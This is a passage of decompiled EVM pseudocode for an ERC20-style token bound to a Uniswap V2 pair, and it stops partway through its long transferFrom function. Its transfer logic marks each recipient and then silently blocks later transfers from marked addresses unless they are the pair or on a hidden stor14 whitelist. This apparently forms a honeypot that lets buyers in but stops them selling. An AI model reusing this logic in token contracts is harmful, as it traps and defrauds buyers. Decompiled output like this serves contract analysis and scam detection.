contract main {




// =====================  Runtime code  =====================


address owner;
array of struct stor1;
array of struct stor2;
uint256 sub_6f0c6f41;
uint8 decimals;
uint256 totalSupply;
uint256 stor6;
uint8 stor8; offset 8
address uniswapV2PairAddress; offset 16
address routerAddress;
mapping of address stor10;
mapping of uint256 balanceOf;
mapping of uint256 stor12;
mapping of uint256 allowance;
mapping of uint256 stor14;

function totalSupply() {
    return totalSupply
}

function decimals() {
    return decimals
}

function uniswapV2Pair() {
    return uniswapV2PairAddress
}

function sub_6f0c6f41(?) {
    return sub_6f0c6f41
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function owner() {
    return owner
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function router() {
    return routerAddress
}

function _fallback() payable {
    revert
}

function renounceOwnership() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    owner = 0
    emit OwnershipTransferred(owner, 0);
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Ownable: new owner is the zero address'
    owner = arg1
    emit OwnershipTransferred(owner, arg1);
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function name() {
    if bool(stor1.length):
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor1.length):
            if bool(stor1.length) == stor1.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor1.length.field_1:
                if 31 < stor1.length.field_1:
                    mem[128] = uint256(stor1.field_0)
                    idx = 128
                    s = 0
                    while stor1.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor1[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)])
                mem[128] = 256 * stor1.length.field_8
        else:
            if bool(stor1.length) == stor1.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor1.length.field_1:
                if 31 < stor1.length.field_1:
                    mem[128] = uint256(stor1.field_0)
                    idx = 128
                    s = 0
                    while stor1.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor1[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)])
                mem[128] = 256 * stor1.length.field_8
        mem[ceil32(stor1.length.field_1) + 192 len ceil32(stor1.length.field_1)] = mem[128 len ceil32(stor1.length.field_1)]
        if ceil32(stor1.length.field_1) > stor1.length.field_1:
            mem[ceil32(stor1.length.field_1) + stor1.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)], mem[(2 * ceil32(stor1.length.field_1)) + 192 len 2 * ceil32(stor1.length.field_1)]), 
    if bool(stor1.length) == stor1.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor1.length):
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor1.length.field_1:
            if 31 < stor1.length.field_1:
                mem[128] = uint256(stor1.field_0)
                idx = 128
                s = 0
                while stor1.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor1[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)])
            mem[128] = 256 * stor1.length.field_8
    else:
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor1.length.field_1:
            if 31 < stor1.length.field_1:
                mem[128] = uint256(stor1.field_0)
                idx = 128
                s = 0
                while stor1.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor1[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)])
            mem[128] = 256 * stor1.length.field_8
    mem[ceil32(stor1.length.field_1) + 192 len ceil32(stor1.length.field_1)] = mem[128 len ceil32(stor1.length.field_1)]
    if ceil32(stor1.length.field_1) > stor1.length.field_1:
        mem[ceil32(stor1.length.field_1) + stor1.length.field_1 + 192] = 0
    return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)], mem[(2 * ceil32(stor1.length.field_1)) + 192 len 2 * ceil32(stor1.length.field_1)]), 
}

function symbol() {
    if bool(stor2.length):
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor2.length):
            if bool(stor2.length) == stor2.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor2.length.field_1:
                if 31 < stor2.length.field_1:
                    mem[128] = uint256(stor2.field_0)
                    idx = 128
                    s = 0
                    while stor2.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor2[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)])
                mem[128] = 256 * stor2.length.field_8
        else:
            if bool(stor2.length) == stor2.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor2.length.field_1:
                if 31 < stor2.length.field_1:
                    mem[128] = uint256(stor2.field_0)
                    idx = 128
                    s = 0
                    while stor2.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor2[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)])
                mem[128] = 256 * stor2.length.field_8
        mem[ceil32(stor2.length.field_1) + 192 len ceil32(stor2.length.field_1)] = mem[128 len ceil32(stor2.length.field_1)]
        if ceil32(stor2.length.field_1) > stor2.length.field_1:
            mem[ceil32(stor2.length.field_1) + stor2.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)], mem[(2 * ceil32(stor2.length.field_1)) + 192 len 2 * ceil32(stor2.length.field_1)]), 
    if bool(stor2.length) == stor2.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor2.length):
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor2.length.field_1:
            if 31 < stor2.length.field_1:
                mem[128] = uint256(stor2.field_0)
                idx = 128
                s = 0
                while stor2.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor2[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)])
            mem[128] = 256 * stor2.length.field_8
    else:
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor2.length.field_1:
            if 31 < stor2.length.field_1:
                mem[128] = uint256(stor2.field_0)
                idx = 128
                s = 0
                while stor2.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor2[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)])
            mem[128] = 256 * stor2.length.field_8
    mem[ceil32(stor2.length.field_1) + 192 len ceil32(stor2.length.field_1)] = mem[128 len ceil32(stor2.length.field_1)]
    if ceil32(stor2.length.field_1) > stor2.length.field_1:
        mem[ceil32(stor2.length.field_1) + stor2.length.field_1 + 192] = 0
    return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)], mem[(2 * ceil32(stor2.length.field_1)) + 192 len 2 * ceil32(stor2.length.field_1)]), 
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if stor14[address(arg1)] <= 0:
        if stor14[address(arg1)]:
            stor12[stor10[0]] = stor6
            stor10[0] = arg2
            if sub_6f0c6f41 <= 0:
                if balanceOf[address(arg1)] < arg3:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)] -= arg3
                if balanceOf[address(arg2)] > -arg3 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg2)] += arg3
                emit Transfer(arg3, arg1, arg2);
            else:
                if stor8:
                    if balanceOf[address(arg1)] < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                else:
                    if stor14[address(arg1)]:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if stor14[address(arg2)]:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if arg3 and sub_6f0c6f41 > -1 / arg3:
                                revert with 'NH{q', 17
                            if arg3 < arg3 * sub_6f0c6f41 / 100:
                                revert with 'NH{q', 17
                            if balanceOf[address(arg1)] < arg3 * sub_6f0c6f41 / 100:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3 * sub_6f0c6f41 / 100
                            if balanceOf[address(arg1)] < arg3 - (arg3 * sub_6f0c6f41 / 100):
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * sub_6f0c6f41 / 100)
                            if balanceOf[address(arg2)] > -arg3 + (arg3 * sub_6f0c6f41 / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_6f0c6f41 / 100)
                            emit Transfer((arg3 - (arg3 * sub_6f0c6f41 / 100)), arg1, arg2);
        else:
            if arg1 == uniswapV2PairAddress:
                stor12[stor10[0]] = stor6
                stor10[0] = arg2
                if sub_6f0c6f41 <= 0:
                    if balanceOf[address(arg1)] < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                else:
                    if stor8:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if stor14[address(arg1)]:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if stor14[address(arg2)]:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if arg3 and sub_6f0c6f41 > -1 / arg3:
                                    revert with 'NH{q', 17
                                if arg3 < arg3 * sub_6f0c6f41 / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[address(arg1)] < arg3 * sub_6f0c6f41 / 100:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3 * sub_6f0c6f41 / 100
                                if balanceOf[address(arg1)] < arg3 - (arg3 * sub_6f0c6f41 / 100):
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * sub_6f0c6f41 / 100)
                                if balanceOf[address(arg2)] > -arg3 + (arg3 * sub_6f0c6f41 / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_6f0c6f41 / 100)
                                emit Transfer((arg3 - (arg3 * sub_6f0c6f41 / 100)), arg1, arg2);
            else:
                if stor12[address(arg1)] <= 0:
                    stor12[stor10[0]] = stor6
                    stor10[0] = arg2
                    if sub_6f0c6f41 <= 0:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if stor8:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if stor14[address(arg1)]:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if stor14[address(arg2)]:
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                else:
                                    if arg3 and sub_6f0c6f41 > -1 / arg3:
                                        revert with 'NH{q', 17
                                    if arg3 < arg3 * sub_6f0c6f41 / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(arg1)] < arg3 * sub_6f0c6f41 / 100:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3 * sub_6f0c6f41 / 100
                                    if balanceOf[address(arg1)] < arg3 - (arg3 * sub_6f0c6f41 / 100):
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * sub_6f0c6f41 / 100)
                                    if balanceOf[address(arg2)] > -arg3 + (arg3 * sub_6f0c6f41 / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_6f0c6f41 / 100)
                                    emit Transfer((arg3 - (arg3 * sub_6f0c6f41 / 100)), arg1, arg2);
    else:
        if stor8:
            if stor14[address(arg1)]:
                stor12[stor10[0]] = stor6
                stor10[0] = arg2
                if sub_6f0c6f41 <= 0:
                    if balanceOf[address(arg1)] < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                else:
                    if stor8:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if stor14[address(arg1)]:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if stor14[address(arg2)]:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if arg3 and sub_6f0c6f41 > -1 / arg3:
                                    revert with 'NH{q', 17
                                if arg3 < arg3 * sub_6f0c6f41 / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[address(arg1)] < arg3 * sub_6f0c6f41 / 100:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3 * sub_6f0c6f41 / 100
                                if balanceOf[address(arg1)] < arg3 - (arg3 * sub_6f0c6f41 / 100):
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * sub_6f0c6f41 / 100)
                                if balanceOf[address(arg2)] > -arg3 + (arg3 * sub_6f0c6f41 / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_6f0c6f41 / 100)
                                emit Transfer((arg3 - (arg3 * sub_6f0c6f41 / 100)), arg1, arg2);
            else:
                if arg1 == uniswapV2PairAddress:
                    stor12[stor10[0]] = stor6
                    stor10[0] = arg2
                    if sub_6f0c6f41 <= 0:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if stor8:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if stor14[address(arg1)]:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if stor14[address(arg2)]:
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                else:
                                    if arg3 and sub_6f0c6f41 > -1 / arg3:
                                        revert with 'NH{q', 17
                                    if arg3 < arg3 * sub_6f0c6f41 / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(arg1)] < arg3 * sub_6f0c6f41 / 100:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3 * sub_6f0c6f41 / 100
                                    if balanceOf[address(arg1)] < arg3 - (arg3 * sub_6f0c6f41 / 100):
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * sub_6f0c6f41 / 100)
                                    if balanceOf[address(arg2)] > -arg3 + (arg3 * sub_6f0c6f41 / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_6f0c6f41 / 100)
                                    emit Transfer((arg3 - (arg3 * sub_6f0c6f41 / 100)), arg1, arg2);
                else:
                    if stor12[address(arg1)] <= 0:
                        stor12[stor10[0]] = stor6
                        stor10[0] = arg2
                        if sub_6f0c6f41 <= 0:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if stor8:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if stor14[address(arg1)]:
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                else:
                                    if stor14[address(arg2)]:
                                        if balanceOf[address(arg1)] < arg3:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] -= arg3
                                        if balanceOf[address(arg2)] > -arg3 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg2)] += arg3
                                        emit Transfer(arg3, arg1, arg2);
                                    else:
                                        if arg3 and sub_6f0c6f41 > -1 / arg3:
                                            revert with 'NH{q', 17
                                        if arg3 < arg3 * sub_6f0c6f41 / 100:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(arg1)] < arg3 * sub_6f0c6f41 / 100:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] -= arg3 * sub_6f0c6f41 / 100
                                        if balanceOf[address(arg1)] < arg3 - (arg3 * sub_6f0c6f41 / 100):
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * sub_6f0c6f41 / 100)
                                        if balanceOf[address(arg2)] > -arg3 + (arg3 * sub_6f0c6f41 / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_6f0c6f41 / 100)
                                        emit Transfer((arg3 - (arg3 * sub_6f0c6f41 / 100)), arg1, arg2);
        else:
            if arg3 > stor6:
                stor14[address(arg2)] = arg3
            else:
                if stor14[address(arg1)]:
                    stor12[stor10[0]] = stor6
                    stor10[0] = arg2
                    if sub_6f0c6f41 <= 0:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if stor8:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if stor14[address(arg1)]:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if stor14[address(arg2)]:
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                else:
                                    if arg3 and sub_6f0c6f41 > -1 / arg3:
                                        revert with 'NH{q', 17
                                    if arg3 < arg3 * sub_6f0c6f41 / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(arg1)] < arg3 * sub_6f0c6f41 / 100:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3 * sub_6f0c6f41 / 100
                                    if balanceOf[address(arg1)] < arg3 - (arg3 * sub_6f0c6f41 / 100):
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * sub_6f0c6f41 / 100)
                                    if balanceOf[address(arg2)] > -arg3 + (arg3 * sub_6f0c6f41 / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_6f0c6f41 / 100)
                                    emit Transfer((arg3 - (arg3 * sub_6f0c6f41 / 100)), arg1, arg2);
                else:
                    if arg1 == uniswapV2PairAddress:
                        stor12[stor10[0]] = stor6
                        stor10[0] = arg2
                        if sub_6f0c6f41 <= 0:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if stor8:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if stor14[address(arg1)]:
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                else:
                                    if stor14[address(arg2)]:
                                        if balanceOf[address(arg1)] < arg3:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] -= arg3
                                        if balanceOf[address(arg2)] > -arg3 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg2)] += arg3
                                        emit Transfer(arg3, arg1, arg2);
                                    else:
                                        if arg3 and sub_6f0c6f41 > -1 / arg3:
                                            revert with 'NH{q', 17
                                        if arg3 < arg3 * sub_6f0c6f41 / 100:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(arg1)] < arg3 * sub_6f0c6f41 / 100:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] -= arg3 * sub_6f0c6f41 / 100
                                        if balanceOf[address(arg1)] < arg3 - (arg3 * sub_6f0c6f41 / 100):
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * sub_6f0c6f41 / 100)
                                        if balanceOf[address(arg2)] > -arg3 + (arg3 * sub_6f0c6f41 / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_6f0c6f41 / 100)
                                        emit Transfer((arg3 - (arg3 * sub_6f0c6f41 / 100)), arg1, arg2);
                    else:
                        if stor12[address(arg1)] <= 0:
                            stor12[stor10[0]] = stor6
                            stor10[0] = arg2
                            if sub_6f0c6f41 <= 0:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if stor8:
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                else:
                                    if stor14[address(arg1)]:
                                        if balanceOf[address(arg1)] < arg3:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] -= arg3
                                        if balanceOf[address(arg2)] > -arg3 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg2)] += arg3
                                        emit Transfer(arg3, arg1, arg2);
                                    else:
                                        if stor14[address(arg2)]:
                                            if balanceOf[address(arg1)] < arg3:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] -= arg3
                                            if balanceOf[address(arg2)] > -arg3 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg2)] += arg3
                                            emit Transfer(arg3, arg1, arg2);
                                        else:
                                            if arg3 and sub_6f0c6f41 > -1 / arg3:
                                                revert with 'NH{q', 17
                                            if arg3 < arg3 * sub_6f0c6f41 / 100:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(arg1)] < arg3 * sub_6f0c6f41 / 100:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] -= arg3 * sub_6f0c6f41 / 100
                                            if balanceOf[address(arg1)] < arg3 - (arg3 * sub_6f0c6f41 / 100):
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * sub_6f0c6f41 / 100)
                                            if balanceOf[address(arg2)] > -arg3 + (arg3 * sub_6f0c6f41 / 100) - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_6f0c6f41 / 100)
                                            emit Transfer((arg3 - (arg3 * sub_6f0c6f41 / 100)), arg1, arg2);
    if allowance[address(arg1)][address(msg.sender)] < arg3:
        revert with 'NH{q', 17
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    allowance[address(arg1)][address(msg.sender)] -= arg3
